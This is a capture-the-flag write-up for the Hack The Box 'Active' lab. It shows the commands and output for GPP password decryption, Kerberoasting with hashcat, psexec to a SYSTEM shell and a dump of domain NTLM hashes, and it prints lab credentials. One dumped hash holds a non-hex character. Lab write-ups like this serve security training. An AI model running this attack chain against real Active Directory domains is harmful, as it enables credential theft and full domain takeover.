+++
date = '2025-02-03T14:41:33-05:00'
draft = false
title = 'HtB Active'
tags = ['writeup','hackthebox','easy','windows','active directory']
hideToc = false
+++
![HtB Active](/images/Active.png)

Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.

<!--more-->
---

## Scanning

### nmap

```sh
┌──(active)─(pl4stic㉿shattersec)-[~/htb/active]
└─$ nmap -T4 -p- -A active.htb    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:15 EST
Nmap scan report for active.htb (10.129.156.161)
Host is up (0.022s latency).
Not shown: 65513 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-03 17:16:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49167/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

### SMB Enumeration

Let's take a look what SMB shares are available to us without any credentials.

```sh
┌──(active)─(pl4stic㉿shattersec)-[~/htb/active]
└─$ smbclient -L \\\\10.129.156.161\\ -N                                       
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
```

## Initial Access

#### GPP

We have read-only access to the `Replication` share, which looks like a copy of a usual `SYSVOL`.  From manual enumeration, I found a `Groups.xml` file in the `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\` directory.  These files sometimes contain a `cpassword` value which can be easily decrypted.

Groups.xml:
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

Now let's decrypt the `cpassword` value using a tool called `gpp-decrypt`.
```sh
┌──(active)─(pl4stic㉿shattersec)-[~/htb/active]
└─$ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18
```

![access](/images/active1.png)

We have a valid set of credentials: `active.htb\SVC_TGS:GPPstillStandingStrong2k18`

## Enumeration

### Bloodhound

```sh
netexec ldap 10.129.156.161 -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb --bloodhound -c all --dns-server 10.129.156.161
```

![bloodhound](/images/active2.png)

## Privilege Escalation

### Get Kerberos TGT

```sh
┌──(pl4stic㉿shattersec)-[~/htb/active]
└─$ impacket-getTGT active.htb/svc_tgs:GPPstillStandingStrong2k18                                                  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_tgs.ccache

┌──(pl4stic㉿shattersec)-[~/htb/active]
└─$ export KRB5CCNAME=svc_tgs.ccache
```

### Get User SPNs

```sh
┌──(pl4stic㉿shattersec)-[~/htb/active]
└─$ impacket-GetUserSPNs active.htb/svc_tgs@10.129.156.161 -k -no-pass -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-02-03 12:15:20.807343             



$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d8bd2fad7796affc79509f1909c662b7$1bbac6cc05b157027917f599b2018dcf5af0278b3234e7429257918977e45a7d80766d32aef39b30b2bca9529e021c7a500429f231692d332bfa4372c9a63d6262064c556eeb99043f932ef1921941ff736733fab2b56dfb0b04ab851d3e1598764107f9715ee2e59d764eb8397edc2ce1eea3c2ad205f3bede4a40c4d6144bbd6e6adb994749c216fa7c676f353269b2bc007045b67c29505593873228f3f49227a7cd1d5aaeaf781e4bb778e2014ab0a32f7589147e42cd86257391e44515296e8bff472151efd2f3d99e16868f6e43b76d00a3081fb0071b3fc2768a35e9abe61d106d7e1e73ecd43fee53d2c3d74d9a840348d04fe00a76537e87dc3a3293f8cf13aaf7e239c04607c7114b1a37e950f7634b98ba5028c72ceac0272062b900e09f2929fb772341164600a7ff81807e8e3fec97a89486693d2e6a874c3362182021872994a7ba2085bfb8b30d0c0cdfdcd2e13e0379ef7e3096014da2026bf6f92577695da79e8b29d79708f445caf593405a5cef193d37141bf45bba0830fe88de8d0dc572fe97e4e274ab3eee160a39a9c5aad824a9511b465438d5e87aff2644bb09b315e0f02fc052057518e8695d02ea451a8c6a37654c459051cb1ccc78d11c8ae19b32c61412290a7051ebea6b7363a737ae950b05ffd3939b2f76096f32d1f94a21f2169228bfd91fbe627406d9af2dc65c0c75e629491d61f59d0fe3ecbfcd0ee8458094d109a07b4f6c40692c8d7797cd6995c1536cfb77d5d13a8b9bda7482b711c2c6092000ed26e76be8236b792140df3b093adc245a0a844f9c26d07f390d8f1fd4fc703932c533c98efd1eeac5994aae4e6417505ed561b20bfc1682f2c4e11488040067fad867f070fbc5233742c6370f02145ef84f32c67ce3319d94855bb0f2500ab7e1c519b9153d0b2de92ed8d4a65035015e2d95d79c00933450fd8518852f04a8363d6b868928c5306d03259b2254d59a3c09262d80816eafc400ddb900388af7db60f88f2d71813e5a92719d844601f8ef3ccf3f8f625488cd77269428de3048238a2616e0603d9e873aebf9f1ff033c40286f37410d11b37515f8ad3a591313aa47678fc7fc70a9d051131a860807881caaa899dd26115ecb2f80e94cc270cfe83dfa92dab63904bfb107e430742841effb976b110e92d5e05f0323f13ab60f01133943debb849c0fc4803e3033fad21f61b9befde5712e9a25fc5d94985e06f39634a2f0a4b6671c29ae483
```

### Crack Kerberos Hash

```sh
┌──(pl4stic㉿shattersec)-[~/htb/active]
└─$ hashcat krb-hash.txt /usr/share/wordlists/rockyou.txt.gz -m 13100
```

Great success... we have new credentials: `active.htb\Administrator:Ticketmaster1968`
![netexec](/images/active3.png)

### PSExec

```shell
┌──(pl4stic㉿shattersec)-[~/htb/active]
└─$ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.129.156.161
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.156.161.....
[*] Found writable share ADMIN$
[*] Uploading file sFewQJaf.exe
[*] Opening SVCManager on 10.129.156.161.....
[*] Creating service wSQh on 10.129.156.161.....
[*] Starting service wSQh.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami 
nt authority\system
```

### Secrets Dump

And for good measure:
```shell
┌──(pl4stic㉿shattersec)-[~/htb/active]
└─$ impacket-secretsdump active.htb/administrator:Ticketmaster1968@10.129.156.161 -just-dc-ntlm
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc:::
active.htb\SVC_TGS:1103:aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:511201298238f3q393c98d3e55fb9136b:::
[*] Cleaning up... 
```
